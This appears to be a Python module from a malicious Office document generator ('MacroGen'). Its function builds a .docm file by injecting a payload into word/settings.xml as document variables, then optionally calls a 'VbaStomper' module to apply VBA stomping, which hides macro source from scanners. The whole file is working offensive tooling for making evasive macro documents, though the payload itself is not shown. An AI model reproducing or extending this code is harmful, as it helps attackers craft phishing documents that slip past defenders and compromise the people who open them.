import os
import sys
import zipfile
from .utils import inject_doc_vars_xml, console

# Add VbaStomper to path (one directory up from MacroGen)
VBA_STOMPER_PATH = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../VbaStomper"))
if VBA_STOMPER_PATH not in sys.path:
    sys.path.append(VBA_STOMPER_PATH)

import stomp

def create_docm(output_path, template_path, doc_vars=None, stomp_doc=False):
    """
    Generates a .docm file by surgically updating the template ZIP.
    Injects the payload into word/settings.xml as a DocVar.
    """
    if not template_path or not os.path.exists(template_path):
        return False, f"Template file not found at {template_path}"

    if not doc_vars:
        doc_vars = {}

    try:
        # Read the settings file from the template first
        settings_data = None
        with zipfile.ZipFile(template_path, 'r') as zin:
            if 'word/settings.xml' in zin.namelist():
                settings_data = zin.read('word/settings.xml')
        
        if not settings_data:
            return False, "Could not find word/settings.xml in template."

        # Handle encoding and inject DocVars
        try:
            content = settings_data.decode('utf-8-sig')
        except:
            content = settings_data.decode('latin-1')
            
        new_content = inject_doc_vars_xml(content, doc_vars)
        
        # Create the new document directly at output_path
        with zipfile.ZipFile(template_path, 'r') as zin:
            with zipfile.ZipFile(output_path, 'w', zipfile.ZIP_DEFLATED) as zout:
                for item in zin.infolist():
                    if item.filename == 'word/settings.xml':
                        zout.writestr(item.filename, new_content.encode('utf-8'))
                    else:
                        zout.writestr(item.filename, zin.read(item.filename))
        
        if stomp_doc:
            success, msg, details = stomp.apply_stomping(output_path)
            if not success:
                return False, f"Stomping failed: {msg}"
            return True, f"Generated .docm and applied VBA Stomping successfully. {msg}"

        return True, "Generated .docm successfully."

    except Exception as e:
        return False, f"Update error: {str(e)}"
